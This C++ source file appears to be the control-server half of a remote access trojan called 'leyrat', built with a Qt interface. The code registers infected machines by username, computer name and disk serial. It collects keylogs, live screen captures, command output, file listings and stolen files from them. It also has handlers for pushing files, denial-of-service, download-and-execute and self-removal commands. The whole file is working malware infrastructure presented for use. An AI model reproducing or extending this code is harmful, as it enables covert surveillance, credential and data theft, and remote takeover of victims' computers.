#define _FILE_OFFSET_BITS  64

#include "leyrat.h"
#include "leybuf.h"
#include "leynet.h"
#include "mainwindow.h"

#include <Windows.h>
#include <stdlib.h>
#include <cstdio>
#include <QApplication>
#include <direct.h>   // _mkdir
#include "x264decoder.h"


leynet_udp net;
leyrat rat;

#define NETBUFFER_SIZE 0xFFFF
#define CLIENT_TIMEOUT_SECS 20

short udpserverport = 27065;
short tcp_ssport = udpserverport+1;
short tcp_fport = udpserverport+2;

int recvtimeout()
{


    while(1)
    {


        for (int i = 0; i < 100000-1; i++)
        {
            if(!rat.onlineclients[i])
                continue;

            if(!rat.onlineclients[i]->last_pingtime)
                continue;

            time_t oldtime = (time_t)rat.onlineclients[i]->last_pingtime;

            time_t delta = (double)(time(0) - oldtime);

            if(abs(delta)<CLIENT_TIMEOUT_SECS)
            {
                continue;
            }


            rat.ClientRemove(i);
        }

        Sleep(1000);
    }

    return 0;
}

int recvfromthink()
{
	char netrecbuffer[NETBUFFER_SIZE];
	memset(netrecbuffer, 0, NETBUFFER_SIZE);

    int msgsize = 0;
    unsigned short port = 1;

	char charip[25];
    net.Receive(&msgsize, netrecbuffer, NETBUFFER_SIZE, charip, port);

	if (!msgsize)
		return 0;

	leybuf buf(netrecbuffer, msgsize);

	if (buf.ReadChar() != '\xDB' || buf.ReadChar() != '\xDB')
	{
		printf("unknown pkg from:%s!\n", charip);
		printf("unknown pkg %i:: %s\n", msgsize, netrecbuffer);


		return 0;
    }

	char type = buf.ReadChar();


	if (!rat.IsOnlineClient(charip))
	{
		if (type == 'a')//acknowledge server
		{
			
			int version = buf.ReadInt32();
			unsigned long diskserial = buf.ReadInt32();

			char language[100];
			char username[260];
			char computername[25];
            char windowsedition[255];

			buf.ReadString(language, 100);
			buf.ReadString(username, 260);
			buf.ReadString(computername, 25);
            buf.ReadString(windowsedition, 255);

            rat.ClientAdd(charip, port, version, diskserial, language, username, computername, windowsedition);
            rat.Callback_AckServer(charip, port, "a");

			return 0;
		}


		printf("pkg from !client:%s!\n", charip);
		printf("unknown pkg %i:: %s\n", msgsize, netrecbuffer);
		return 0;
	}

    rat.Callback_LastPing(charip);

    if(type== '_')//ack
    {
        char acktype[100];
        buf.ReadString(acktype, 100);

        rat.Callback_AckServer(charip, port, acktype);
        return 0;
    }

	if (type == 'b')//run cmd
    {
        char *rancmd = netrecbuffer+buf.GetPos();

        rat.Callback_RunCmd(charip, rancmd, buf.GetNumBytesLeft());
		return 0;
	}

	if (type == 'c')//list files
	{
		int numfiles = 0;
		char **files = new char*[0xFFFF];

        while (buf.GetNumBytesLeft()>0)
        {
            char *file = new char[260];
            memset(file, 0, 260);

            buf.ReadString(file, 259);


            files[numfiles] = file;
            numfiles++;
        }


        rat.Callback_FileList(charip, files, numfiles);

        if(numfiles)
        {
            for(int i=0;i<numfiles;i++)
            {
                if(files[i])
                {
                    delete files[i];
                    files[i] = 0;
                }
            }

        }


        if(files)
            free(files);

		return 0;
	}

	if (type == 'd')//(download || delete) file, 0 length deletes file
	{
		char is_delete = buf.ReadChar() == '2';

		if (is_delete)
            rat.Callback_FileDelete(charip);
		else
            rat.Callback_FileDownload(charip);

	}

	if (type == 'e')//upload file
    {
        //error, thats why udp
        onlineuser *cl = rat.GetClient(charip);
        cl->is_downloading = 0;
        cl->is_uploading = 0;

	}

	if (type == 'g')//dos
	{
        rat.Callback_Dos(charip);
	}

	if (type == 'l')//screenshare input
    {
        rat.Callback_ScreenshareInput(charip);
	}

	if (type == '1')//update/download&execute
	{
        rat.Callback_HTTPDownload(charip);
	}

	if (type == '2')//suicide
	{
        rat.Callback_Suicide(charip);

	}

    if(type=='!')//keylog
    {

        unsigned int cllogsize = buf.ReadInt32();

        unsigned int keylogsize = buf.GetNumBytesLeft()+1;


        char *keylog = new char[keylogsize+1];


        buf.ReadBytes(keylog, keylogsize);

        printf("KEYLOG: %s\n", keylog);

        rat.Callback_KeyLog(charip, keylog);

        delete keylog;

    }

	return 0;
}

int recvthread()
{
    while (true)
    {
        recvfromthink();
	}

	return 0;
}






int recvthread_ss()
{

    int size = 0;


    leynet_tcp ss_tcp;
    ss_tcp.Bind(tcp_ssport);

    char charip[25];
    unsigned short port = 1;

    unsigned int sock = 0;



    while (true)
    {

        Sleep(1);

        memset(charip, 0, 25);
        size = 0;
        sock = 0;


        ss_tcp.Listen(charip, port, &sock);

        if(!sock)
            continue;

        leynet_tcp *recnet = new leynet_tcp;
        recnet->SetSock(sock) ;

        if(!rat.IsOnlineClient(charip)||!rat.GetClient(charip)->is_screensharing)
        {
            recnet->CloseConnection();
            delete recnet;
            continue;
        }

        rat.Callback_LastPing(charip);

        static int ss_width;
        static int ss_height;

        static int realwidth;
        static int realheight;

        ss_height = 0;
        ss_width = 0;

        realwidth = 0;
        realheight = 0;

        static time_t lastrectime;
        lastrectime = 0;
        time(&lastrectime);

        static std::string ss_buffer;
        if(ss_buffer.length())
        {
            ss_buffer.erase(0, ss_buffer.length());
        }

        static char*tmpip = 0;
        tmpip = charip;

        static onlineuser *cl;
        cl = rat.GetClient(charip);

        static x264Decoder *x264_decoder = 0;

        recnet->Receive(&size, 0, 0xFFFFF, [](unsigned int datalen, unsigned int curdatalen, char*buffer, char*curbuffer) -> bool
        {
            time_t curtime;
            time(&curtime);


            double diff = difftime(curtime, lastrectime);

            if(diff>5)
                return true;

            if(!cl||!cl->is_screensharing)
                return true;


            if(!curdatalen)
                return false;

            time(&lastrectime);

            unsigned int headerlen = 1+1+1+4+4;

            if(!ss_height&&curdatalen>=headerlen)
            {


                leybuf readheader(curbuffer, curdatalen);
                if (readheader.ReadChar() != '\xDB' || readheader.ReadChar() != '\xDB')
                    return false;


                if(readheader.ReadChar() != 'j')
                    return false;

                ss_width = readheader.ReadInt32();
                ss_height = readheader.ReadInt32();
                realwidth = readheader.ReadInt32();
                realheight = readheader.ReadInt32();

                printf("New image: %lu __ %lu\n", ss_width, ss_height);

                if(!x264_decoder)
                {
                    x264_decoder = new x264Decoder(ss_width, ss_height);
                }

                if(curdatalen-headerlen>0)
                {
                    ss_buffer.append(curbuffer+headerlen, curdatalen-headerlen);
                }
            }

            leybuf checkend(curbuffer, curdatalen);
            checkend.SetPos(curdatalen-9);

            char end[10];
            checkend.ReadBytes(end, 9);

            if(!memcmp(end, "\xFF\xFA\xFB\xFD\xFC\xFB\xBB\xAA\xDD", 9))
            {
                ss_buffer.append(curbuffer, curdatalen-9);

                if(!x264_decoder)
                {
                    x264_decoder = new x264Decoder(ss_width, ss_height);
                }

                if(ss_width!=x264_decoder->image_w_||ss_height!=x264_decoder->image_h_)
                {
                    x264_decoder->~x264Decoder();
                    delete x264_decoder;
                    x264_decoder = new x264Decoder(ss_width, ss_height);

                }
                unsigned char*rgbbuffer = x264_decoder->decodeFrame(ss_buffer.data(), ss_buffer.size());

                printf("!");

                if(rgbbuffer)
                {
                    rat.Callback_Screenshare(tmpip, ss_width, ss_height, realwidth, realheight, ss_buffer.size(), rgbbuffer);

                    delete rgbbuffer;
                    rgbbuffer = 0;
                }

                ss_width = 0;
                ss_height = 0;
                ss_buffer.erase(0, ss_buffer.length());

                return false;
            }

            if(!memcmp(end, "\xFF\xFF\xFA\xFC\xFC\xFC\xBD\xBA\xBD", 9))
            {
                return true;
            }

            ss_buffer.append(curbuffer, curdatalen);

            return false;
        });


        recnet->CloseConnection();
        delete recnet;
        delete x264_decoder;
        x264_decoder = 0;
    }

    return 0;
}


bool isDirExist(const std::string& path)
{
#if defined(_WIN32)
    struct _stat info;
    if (_stat(path.c_str(), &info) != 0)
    {
        return false;
    }
    return (info.st_mode & _S_IFDIR) != 0;
#else
    struct stat info;
    if (stat(path.c_str(), &info) != 0)
    {
        return false;
    }
    return (info.st_mode & S_IFDIR) != 0;
#endif
}

bool makePath(const std::string& path)
{
#if defined(_WIN32)
    int ret = _mkdir(path.c_str());
#else
    mode_t mode = 0755;
    int ret = mkdir(path.c_str(), mode);
#endif
    if (ret == 0)
        return true;

    switch (errno)
    {
    case ENOENT:
        // parent didn't exist, try to create it
        {
            int pos = path.find_last_of('/');
            if (pos == std::string::npos)
#if defined(_WIN32)
                pos = path.find_last_of('\\');
            if (pos == std::string::npos)
#endif
                return false;
            if (!makePath( path.substr(0, pos) ))
                return false;
        }
        // now, try to create again
#if defined(_WIN32)
        return 0 == _mkdir(path.c_str());
#else
        return 0 == mkdir(path.c_str(), mode);
#endif

    case EEXIST:
        // done!
        return isDirExist(path);

    default:
        return false;
    }
}

static FILE* filehandle = 0;

int recvthread_files()
{

    int size = 0;


    leynet_tcp ss_tcp;
    ss_tcp.Bind(tcp_fport);

    char charip[25];
    unsigned short port = 1;

    unsigned int sock = 0;

    while(1)
    {

        Sleep(1000);

        memset(charip, 0, 25);
        size = 0;
        sock = 0;


        ss_tcp.Listen(charip, port, &sock);

        if(!sock)
            continue;

        leynet_tcp *clienttcp = new leynet_tcp;
        clienttcp->SetSock(sock) ;
        clienttcp->SetNonBlocking(false);

        onlineuser *cl = rat.GetClient(charip);

        if(!rat.IsOnlineClient(charip)||!cl||(!cl->is_uploading&&!cl->is_downloading))
        {
            clienttcp->CloseConnection();
            delete clienttcp;

            continue;
        }

        rat.Callback_LastPing(charip);


        if(cl->is_uploading)
        {

            char pathtofile[512];
            memset(pathtofile, 0, 512);

            int clientpath_length = rat.GetClientPath(charip, pathtofile, 512);

            std::string fixeduploading = cl->is_uploading;
            fixeduploading.erase(0, fixeduploading.find(":/")+2);

            strcat(pathtofile+clientpath_length, fixeduploading.c_str());

            std::string justpath = pathtofile;
            justpath.erase(justpath.find_last_of("/\\"));
            makePath(justpath);

            printf("Path: %s\nCreated file: %s!\n", justpath.c_str(), pathtofile);

            filehandle = fopen(pathtofile, "wb");

            if(!filehandle)
            {
                printf("Couldn't create file: %s!\n", pathtofile);
                cl->is_uploading = false;
                clienttcp->CloseConnection();
                delete clienttcp;
                continue;
            }



            static time_t lastrectime;
            static onlineuser *curclient;
            curclient = cl;

            lastrectime = 0;
            time(&lastrectime);

            clienttcp->Receive(&size, 0, 0xFFFFFF, [](unsigned int datalen, unsigned int curdatalen, char*buffer, char*curbuffer) -> bool
            {
                if(!curclient||!curclient->is_uploading)
                {
                    return true;
                }

                time_t curtime;
                time(&curtime);


                double diff = difftime(curtime, lastrectime);

                if(diff>7)
                {
                    printf("timeout\n");
                    return true;
                }

                if(!curdatalen)
                    return false;

                time(&lastrectime);

                printf("RECEIVING CHUNK LEN: %lu\n", curdatalen);


                if(curdatalen >= 9)
                {


                    leybuf checkend(curbuffer, curdatalen);
                    checkend.SetPos(curdatalen-9);

                    char end[10];
                    checkend.ReadBytes(end, 9);

                    if(!memcmp(end, "\xFF\xFA\xFB\xFD\xFC\xFB\xBB\xAA\xDD", 9))
                    {
                        fwrite(curbuffer, sizeof(char), curdatalen-9, filehandle);
                        printf("EOF\n");
                        return true;
                    }

                }

                fwrite(curbuffer, sizeof(char), curdatalen, filehandle);

                return false;
            });

            fclose(filehandle);
            filehandle = 0;
            clienttcp->CloseConnection();

            delete clienttcp;
            clienttcp = 0;

            rat.Callback_FileUpload(charip, cl->is_uploading);

            cl->is_downloading = 0;
            cl->is_uploading = 0;

            continue;
        }

        //downloading

        FILE *filehandle = fopen(cl->is_downloading, "rb");

        if(!filehandle)
        {
            printf("couldnt open file: %s!\n", cl->is_downloading);

            clienttcp->CloseConnection();
            delete clienttcp;
            clienttcp = 0;

            cl->is_downloading = 0;
            cl->is_uploading = 0;
            continue;
        }

        fseek(filehandle, 0, FILE_END);
        unsigned long long filelen = _ftelli64(filehandle);
        unsigned long long bytesleft = filelen;

        rewind(filehandle);



        printf("Sending client: [%llu] %s\n", filelen, cl->is_downloading);

        char*chunkbuf = new char[5002];

        while(bytesleft)
        {
            memset(chunkbuf, 0, 5002);

            unsigned long chunksize = 5000;

            if(chunksize>bytesleft)
            {
                printf("Sending %llu bytes!\n", bytesleft);

                fread(chunkbuf, sizeof(char), bytesleft, filehandle);
                //Sleep(100);
                clienttcp->Send(chunkbuf, bytesleft);
                break;
            }

            printf("Sending %lu bytes!\n", chunksize);
            fread(chunkbuf, sizeof(char), chunksize, filehandle);

            //Sleep(100);
            clienttcp->Send(chunkbuf, chunksize);

            bytesleft -= chunksize;
        }

        clienttcp->Send("\xFF\xFA\xFB\xFD\xFC\xFB\xBB\xAA\xDD", 9);

        clienttcp->CloseConnection();
        delete clienttcp;
        clienttcp = 0;

        printf("CLIENT IS DONE DLING!\n");

        cl->is_downloading = 0;
        cl->is_uploading = 0;
    }

    return 0;
}

int main(int argc, char *argv[])
{
    QApplication a(argc, argv);
    MainWindow w;
    w.show();

    net.Start();
    net.OpenSocket(udpserverport);

    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)recvtimeout, 0, 0, 0);
    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)recvthread, 0, 0, 0);
    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)recvthread_ss, 0, 0, 0);
    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)recvthread_files, 0, 0, 0);

    return a.exec();
}
